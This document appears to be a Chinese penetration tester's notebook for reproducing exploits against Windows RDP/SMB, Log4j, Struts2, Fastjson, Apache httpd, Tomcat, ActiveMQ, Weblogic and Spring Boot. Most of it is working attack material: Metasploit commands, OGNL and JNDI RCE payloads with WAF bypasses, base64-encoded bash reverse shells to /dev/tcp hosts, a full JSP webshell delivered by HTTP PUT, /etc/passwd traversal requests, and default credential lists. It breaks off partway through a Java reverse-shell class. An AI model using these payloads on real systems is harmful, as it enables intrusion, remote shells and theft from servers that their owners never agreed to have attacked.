# 漏洞复现

## Real-Exploits

### 大纲

* 操作系统漏洞
  * Windows
  * Linux
* Web服务器漏洞
  * Nginx
  * JBoss
  * Apache
    * Apache-log4j2
    * Apache-Struts2
    * Apache-fastjson
    * Apache-httpd
    * Apache-tomcat
    * Apache-ActiveMQ
    * Apache-Solr
    * Apache-OFBiz
    * Apache-Druid
    * Apache-JSPWiki
    * Apache-Filnk
    * Apache-SkyWalking
    * Apache-Apisix
  * Weblogic
  * Springboot
* 应用服务器漏洞
  * Elasticsearch
  * Postgres
  * Oracle
  * Redis
* 开发框架漏洞
  * Jquery
* 开发语言漏洞
  * PHP
    * PHP-XXE
    * PHP-Unit
    * PHP-FPM
    * PHP-XDebug
    * PHP-Inclusion
* Web应用漏洞
  * GlassFish
  * uWSGI
  * Rails
  * PostScript
  * Jupyter
  * Imagetragick
  * GoAhead
  * Grafana
  * Harbor
  * phpmyadmin
  * Supervisord
  * Flask
  * Django
  * sentry
  * TerraMaster-Tos
* CMS漏洞
  * Discuz
  * thinkphp
  * Truecms
  * phpcms
* OA漏洞
  * FineReport
  * 致远

### 操作系统漏洞

#### Windows

**CVE-2019-0708-远程桌面代码执行漏洞**

**漏洞影响版本**

* Windows 7
* Windows server 2008 R2
* Windows server 2008
* Windows 2003
* Windows xp

```bash
# 测试是否存在0708漏洞
msfconsole
search 0708
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
show options
set rhosts 32.137.32.10
run

# 漏洞利用，这个不需要，只需完成上面
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
show targets //选择目标主机类型  这里我选择了7601 -vmware 15
set target 4
set rhost 192.168.70.22
run
```

**CVE-2015-1635-HTTP.SYS远程代码执行漏洞**

> MS15-034

主要影响了包括Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2在内的主流服务器操作系统。

利用HTTP.sys安全漏洞-读取IIS服务器的内存数据

```
msfconsole
search ms15-034
use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
set rhosts 172.30.0.250
run
```

**MS17-010-永恒之蓝**

目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。

```
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
show options
set rhosts 172.16.100.76
exploit
```

**MS12-020-远程桌面协议RDP远程代码执行漏洞**

```
msfconsole
use auxiliary/scanner/rdp/ms12_020_check
set rhosts 192.168.178.128
run
```

#### Linux

### Web服务器漏洞

#### Nginx

**Nginx解析漏洞**

* 漏洞描述
  * nginx解析漏洞因为用户配置不当造成的漏洞。
  * 1.jpg/.php、1.jpg/.php，1.jpg会被当成php格式解析
* 漏洞利用

上传图片马

```
http://node4.buuoj.cn:26749/uploadfiles/e07db0b27893a41573453510ee2dceed.png/.php
```

不添加.php的时候为404&#x20;

**CVE-2013-4547**

> Nginx 文件名逻辑漏洞（CVE-2013-4547）

* 影响版本：Nginx 0.8.41 \~ 1.4.3 / 1.5.0 \~ 1.5.7
* 参考文章
  * https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547
* 漏洞利用
  * 上传页面，首先上传kite.png图片马

注意kite.png后面要加个空格

第二步访问`http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php`

其中`[0x20][0x00]`需要在burpsuite的hex改

#### JBOSS

**CVE-2017-12149**

> JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）

* 漏洞详情
  * 该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。
* 漏洞利用
  * jboss反序列化\_CVE-2017-12149.jar

**JMXInvokerServlet-deserialization**

* 漏洞详情
  * 这是经典的JBoss反序列化漏洞，JBoss在/invoker/JMXInvokerServlet请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。
* 漏洞利用
  * jboss反序列化\_CVE-2017-12149.jar

**CVE-2017-7504**

* 影响版本
  * Red Hat JBoss Application Server <=4.x
* 漏洞详情
  * Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。
* 漏洞利用

1. 编译并生成序列化数据

```bash
javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java
```

1. 设置反弹ip与端口

```bash
java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "sh -i >& /dev/tcp/1.117.51.253/7777 0>&1"
```

1. 服务器监听

```bash
nc -lvnp 7777
```

1. 发送数据包

```bash
curl http://vulfocus.fofa.so:33463/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser
```

* 参考文章
  * https://github.com/fofapro/vulfocus/blob/master/writeup/CVE-2017-7504/CVE-2017-7504.md
  * https://github.com/joaomatosf/JavaDeserH2HC

#### Apache

**Apache-log4j2**

Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。

探测工具bp插件：

* https://github.com/pochubs/Log4j2Scan-1
* https://github.com/f0ng/log4j2burpscanner

探测用burpsuite scan自动扫描 Dashboard可看见结果Issue activity。

**CVE-2021-44228-log4j2-rce漏洞**

Log4j2反弹shell

影响版本：all log4j-core versions >=2.0-beta9 and <=2.14.1

sh -i >& /dev/tcp/10.30.1.49/7777 0>&1

需要拿去base64编码链接如下

https://www.jackson-t.ca/runtime-exec-payloads.html

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjIwMC4zLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}" -A 172.16.200.3

32.137.126.102

`nc -lvnp 7777`

GET传输需要URL对`{}|:`编码

```
$%7bjndi%3Aldap%3A//htlii7.dnslog.cn/Axw%7d
```

POST传输

```
POST /hello HTTP/1.1
Host: vulfocus.fofa.so:30484
Content-Type: application/x-www-form-urlencoded

payload="${jndi:rmi://172.16.200.3:1099/cxat29}"
```

tomcat回显方法：

* 参考文章：https://zone.huoxian.cn/d/729-log4j2

```
POST /api/ HTTP/1.1
Host: xxxxx:6631
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
cmd: whoami
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

data=${jndi:ldap://10.30.0.142:1389/Basic/SpringEcho}





```

`java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.30.0.142 -p 9190`

```
payload=${jndi:ldap://10.30.0.142:1389/TomcatBypass/TomcatEcho}
```

反弹shell： `data=${jndi:ldap:// 10.30.1.112:1389/Basic/ReverseShell/xxxx/5551}`

其它dnslog payload：

```
c=${jndi:ldap://xxx.dnslog.cn}
```

$%7bjndi:ldap://c65yoi.dnslog.cn/exp%7d

Bypass WAF

```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```

图形化测试工具：https://github.com/nice0e3/log4j\_POC

**CVE-2021-45105-log4j2-DDOS**

* 影响版本
  * log4j2：2.16.0
* 漏洞详情
  * CVE-2021-45105的Apache Log4j2拒绝服务攻击漏洞，当系统日志配置使用非默认的模式布局和上下文查找时，攻击者可以通过构造包含递归查找数据包的方式，控制线程上下文映射 (MDC)，导致StackOverflowError产生并终止进程，实现拒绝服务攻击。目前只有log4j-core JAR 文件受此漏洞影响。仅使用log4j-api JAR文件而不使用log4j-core JAR文件的应用程序不受此漏洞的影响。
* 漏洞利用（会导致服务崩溃-不需要使用）
  * `${${::-${::-$${::-j}}}}`
* 修复建议
  * https://github.com/apache/logging-log4j2/tags

**Apache-Struts2**

探测工具：https://github.com/shack2/Struts2VulsTools

支持的范围：S2-057,S2-048,S2-046,S2-045,S2-016,S2-019,S2-037,S2-032

S2-046以后的洞难以扫出来，需要自己寻找利用点，简单来说没有通用的链

其它利用工具

* https://github.com/HatBoy/Struts2-Scan - Python3 Struts2 全漏洞扫描利用工具

**s2-009**

影响版本: 2.1.0 - 2.3.1.1

id

```
/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
```

env

```
/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
```

**s2-012**

影响版本：2.1.0 - 2.3.13

payload:(读取etc/passwd文件)

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

打印env环境变量

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

**s2-013**

**s2-015**

影响版本: 2.0.0 - 2.3.14.2

**s2-045**

**s2-048**

影响版本: 2.0.0 - 2.3.32

漏洞利用工具：https://github.com/dragoneeg/Struts2-048

`python Struts048.py http://node4.buuoj.cn:28719/integration/saveGangster.action`

`python Struts048.py http://node4.buuoj.cn:28719/integration/saveGangster.action whoami`

**s2-052**

影响版本: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12

启用 Struts REST 插件并使用 XStream 组件对 XML 进行反序列操作时，未对数据内容进行有效验证，可被攻击者进行远程代码执行攻击(RCE)。

漏洞测试工具:

* https://github.com/mazen160/struts-pwn\_CVE-2017-9805

```
Python struts-pwn.py --exploit --url "http://node4.buuoj.cn:26796/orders/4/edit" -c "wget ip:port"
```

**s2-053**

影响版本: Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10

Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。

漏洞复现：(以下是一个提交页面)

http://your-ip:8080/hello.action

输入如下payload：

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

**S2-057**

影响版本:<= Struts 2.3.34, Struts 2.5.16

payload

```
http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action
```

```
${
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

```

http://node3.buuoj.cn:29922/struts2-showcase/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/actionChain1.action
```

**Apache-fastjson**

Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。

* 漏洞扫描探测
  * https://github.com/Maskhe/FastjsonScan

需要post参数，没有参数的情况下填写（以下两种都可，否则为notsupport）

```
{}
params=1
```

**1.2.24-rce**

方法同理1.2.27，payload不一样

```
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/TouchFile",
        "autoCommit":true
    }
}
```

**1.2.27-rce**

影响版本：fastjson <= 1.2.47

**JNDI注入**

相关工具：https://github.com/welk1n/JNDI-Injection-Exploit

反弹shell需要先编码成base64

在线java编码网站：[java.lang.Runtime.exec() Payload Workarounds](https://www.jackson-t.ca/runtime-exec-payloads.html)

如：`sh -i >& /dev/tcp/111.111.111.111/8888 0>&1`需要先拖进去编码

首先要启动一个 RMI 或者 LDAP 服务：在VPS上执行

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<payload>" -A <vps>
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy41MS4yNTMvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" -A 111.111.111.111
```

监听8888端口:

```
nc -lvnp 8888
```

目标站点抓包发送如下payload，header需要添加POST的`Content-Type: application/json`

```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://111.111.111.111:1389/yomh4h",
        "autoCommit":true
    }
}
```

**Apache-httpd**

**Apache—HTTPD-多后缀解析漏洞**

* 影响版本：2.4.0 < HTTPD <2.4.29
* 参考文章
  * https://github.com/vulhub/vulhub/tree/master/httpd/apache\_parsing\_vulnerability
* 漏洞详情
  * 在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。
* 漏洞利用

**CVE-2021-42013**

* 漏洞利用工具
* https://github.com/asaotomo/CVE-2021-42013-Apache-RCE-Poc-Exp

```
GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1
Host: vuglfocus.fofa.so:55493
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ZMSESSID=fcnisfo6rj1snid6e5r27kj1n0; zmSkin=classic
Connection: close
```

```
GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
Host: vuglfocus.fofa.so:55493
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ZMSESSID=fcnisfo6rj1snid6e5r27kj1n0; zmSkin=classic
Connection: close
Content-Length: 57

echo Content-Type: text/plain; echo;ls /
```

**CVE-2017-15715-Apache换行解析漏洞**

* 影响版本：2.4.0 < HTTPD <2.4.29
* 漏洞详情
  * 在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。
* 参考文章
  * https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715

**Apache-tomcat**

**CVE-2017-12615**

> Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）

当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。

影响版本：Apache Tomcat 7.0.0 \~ 7.0.81 影响平台：Windows

传一个webshell

```
PUT /shell.jsp/ HTTP/1.1
Host: your-ip:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>
```

/shell.jsp?cmd=whoami\&pwd=023

备注：我尝试了冰蝎，也是可以的

其它payload：

在window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名

```
PUT /111.jsp::$DATA HTTP/1.1
Host: 10.1.1.6:8080
User-Agent: JNTASS
DNT: 1
Connection: close

...jsp shell...
```

参考文章：

* https://blog.csdn.net/qq\_36241198/article/details/114883818

**Tomcat8+弱口令+后台getshell漏洞**

Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。

tomcat弱口令:（其它需要抓包爆破，可用xray爆破）

```
admin/admin
tomcat/tomcat
tomcat/admin
admin/123456
```

**msf弱口令爆破**

```
use auxiliary/scanner/http/tomcat_mgr_login
set rhosts 192.168.52.130
set rport 8080
run
```

上传由1.jsp压缩后的1.zip改为后缀的1.war包

访问http://xxxx/1/1.jsp

参考文章：

* https://www.cnblogs.com/qianxinggz/p/13440366.html

**CVE-2020-13935-拒绝服务攻击**

tomcat-echo.html 拒绝服务攻击

https://github.com/RedTeamPentesting/CVE-2020-13935

```
tcdos.exe ws://218.91.233.149:8078/example
s/websocket/echoStreamAnnotation
```

**Apache-ActiveMQ**

默认端口：8161 默认账号密码:admin/admin root/root 后台地址： /admin

* https://mp.weixin.qq.com/s/5U7v22q2WeLmCnkq7mfr8w ActiveMQ系列漏洞汇总复现

**CVE-2015-5254**

* 漏洞描述
  * Apache ActiveMQ 5.13.0 之前 5.x 版本中存在安全漏洞,该漏洞源于程序没有限制可在代理中序列化的类.远程攻击者可借助特制的序列化的 Java Message Service(JMS)ObjectMessage 对象利用该漏洞执行任意代码.
* 影响版本
  * Apache ActiveMQ 5.0.0 \~ 5.12.1
* 漏洞利用

```bash
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMS4xMTcuNTEuMjUzLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}" -Yp ROME vulfocus.fofa.so 17928

nc -l -p 7777
```

* 参考文章
  * https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md
  * https://github.com/matthiaskaiser/jmet

**CVE-2017-15709**

* 漏洞描述
  * Apache ActiveMQ 默认消息队列 61616 端口对外，61616 端口使用了 OpenWire 协议，这个端口会暴露服务器相关信息，这些相关信息实际上是 debug 信息。会返回应用名称，JVM，操作系统以及内核版本等信息。
* 影响版本 5.14.0 < Apache ActiveMQ < 5.14.5 5.15.0 < Apache ActiveMQ < 5.15.2
*   漏洞利用

    ```
    telnet ip 61616
    ```

参考链接： - https://github.com/ffffffff0x/1earn/blob/27236f18098d66d7cf5c881dc70236968d5219cf/1earn/Security/RedTeam/Web%E5%AE%89%E5%85%A8/BS-Exploits.md#activemq

**Apache-Solr**

**log4j影响**

> Apache Solr Log4j组件 远程命令执⾏漏洞

*   影响版本：

    ```
    v7.4.0 <= Solr <= v7.7.3
    v8.0.0 <= Solr < v8.11.1
    ```

payload：

```
/solr/admin/collections? action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
/solr/admin/info/system?_=${jndi:ldap://0.0.0.0/123}&wt=json
/solr/admin/cores?_=&action=&config=&dataDir=&instanceDir=${jndi:ldap://0.0.0.0/123}&name=&schema=&wt=
```

**Apache-OFBiz**

**log4j影响**

* 影响版本
  * OFBiz < v18.12.03
*   POC

    ```
    GET: https://0.0.0.0:8443/webtools/control/main
    Cookie: OFBiz.Visitor=${jndi:ldap://0.0.0.0/123}
    ```

    ```
    POST: https://0.0.0.0:8443/webtools/control/setLocaleFromBrowser
    Content-Type: text/html;charset=UTF-8${jndi:ldap://0.0.0.0/123}
    ```

**Apache-druid**

**log4j影响**

* 影响版本
*   POC

    ```
    http://0.0.0.0:8888/druid/coordinator/${jndi:ldap://0.0.0.0/123}
    http://0.0.0.0:8888/druid/indexer/${jndi:ldap://0.0.0.0/123}
    http://0.0.0.0:8888/druid/v2/${jndi:ldap://0.0.0.0/123}
    ```

**Apache-JSPWiki**

**log4j影响**

* 影响版本
  * JSPWiki = V2.11.0
*   POC 有过滤，需要使用绕过语句触发

    ```
    http://0.0.0.0:8080/wiki/$%7Bjndi:ldap:$%7B::-/%7D/0.0.0.0/123%7D

    http://0.0.0.0:8080/Edit.jsp?page=Main
    X-Forwarded-For:${jndi:dns://0.0.0.0/123}
    ```

**Apache-Filnk**

**log4j影响**

* 影响版本
  * 四个系列：< v1.14.2, < v1.13.5, < v1.12.7, < v1.11.6
*   POC

    ```bash
    GET: http://0.0.0.0:8081/jars/11.jar/plan?entry-class=1¶llelism=1${jndi:dns://0.0.0.0/123}&program-args=1

    #url双编码绕过//
    POST: http://0.0.0.0:8081/jars/${jndi:ldap:%252f%252f0.0.0.0%252f123}.jar/run
    ```

**Apache-SkyWalking**

**log4j影响**

* 影响版本
  * SkyWalking < v8.9.1
*   POC

    ```
    POST: http://0.0.0.0:8080/graphql
    data: {"query":"${jndi:dns://0.0.0.0/123}","variables":{"duration":{"start":"2021-12-22 1259","end":"2021-12-22 1314","step":"MINUTE"}}}
    ```

#### Apache-Apisix

Apache APISIX 是一个动态、实时、高性能的 API 网关，Apache APISIX Dashboard 使用户可通过前端界面操作 Apache APISIX。

**CVE-2021-45232**

* 漏洞描述
  * Apache APISIX Dashboard v2.7-2.10版本中存在未授权访问漏洞，攻击者无需登录就可以访问某些接口，深入分析发现还可以RCE。
*   工具地址

    * https://github.com/wuppp/cve-2021-45232-exp

    ```
    python apisix_dashboard_rce.py http://127.0.0.1:9000
    curl http://127.0.0.1:90000/xxxx -H "cmd:ifconfig"
    ```
* 参考文章
  * https://mp.weixin.qq.com/s/WEfuVQkhvM6k-xQH0uyNXg

**Weblogic**

Weblogic中间件渗透总结:https://www.freebuf.com/vuls/325955.html

**CVE-2018-2628**

weblogic漏洞利用图形化-雷石安全

**CVE-2018-2894**

https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894

Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。

利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。

访问http://your-ip:7001/console，即可看到后台登录页面 弱口令进入后台

登录后台页面，点击base\_domain的配置，在“高级”中开启“启用 Web 服务测试页”选项： 这是前提条件

访问`http://your-ip:7001/ws_utc/config.do`，设置Work Home Dir为`/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css`。我将目录设置为ws\_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。

然后点击安全 -> 增加，然后上传webshell：

上传后，查看返回的数据包，其中有时间戳：

`http://your-ip:7001/ws_utc/css/config/keystore/1633759987859_cmd.jsp`

**CVE-2019-2725**

exp地址：https://github.com/TopScrew/CVE-2019-2725

weblogic漏洞利用图形化-雷石安全

**CVE-2014-4210**

weblogic SSRF漏洞(CVE-2014-4210)

https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf

```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:701 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```

修改为一个不存在的端口，将会返回could not connect over HTTP to server。

```
An error has occurred
weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: '1' addresses, but could not connect over HTTP to server: '127.0.0.1', port: '701'
```

**weblogic-WeakPwd弱口令**

常见弱口令集合：https://cirt.net/passwords?criteria=weblogic

exp地址：https://github.com/rabbitmask/WeblogicWeakPwd

修改ip.txt,内容如10.30.1.10

```
python weblogicweakpwd.py
```

* [Weblogic常规渗透测试](https://github.com/vulhub/vulhub/tree/master/weblogic/weak\_password)

**Springboot**

* https://github.com/LandGrey/SpringBootVulExploit
* https://github.com/0x727/SpringBootExploit

**实战文章**

* 记一次渗透一波三折找到的springboot利用:http://yiyekuzhou.xyz/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/

**测试漏洞**

**h2-database-console-JNDI-RCE**

https://github.com/LandGrey/SpringBootVulExploit#0x07h2-database-console-jndi-rce

步骤一: 直接访问目标开启 h2 console 的默认路由 /h2-console，目标会跳转到页面 /h2-console/login.jsp?jsessionid=xxxxxx，记录下实际的 jsessionid=xxxxxx 值。

步骤二: 准备要执行的 Java 代码(需要修改vps和端口)

编写优化过后的用来反弹 shell 的 Java 示例代码 JNDIObject.java，

https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java

```java
/**
 *  javac -source 1.5 -target 1.5 JNDIObject.java
 *
 *  Build By LandGrey
 * */

import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class JNDIObject {
    static {
        try{
            String ip = "your-vps-ip";
            String port = "443";
            String py_path = null;
            String[] cmd;
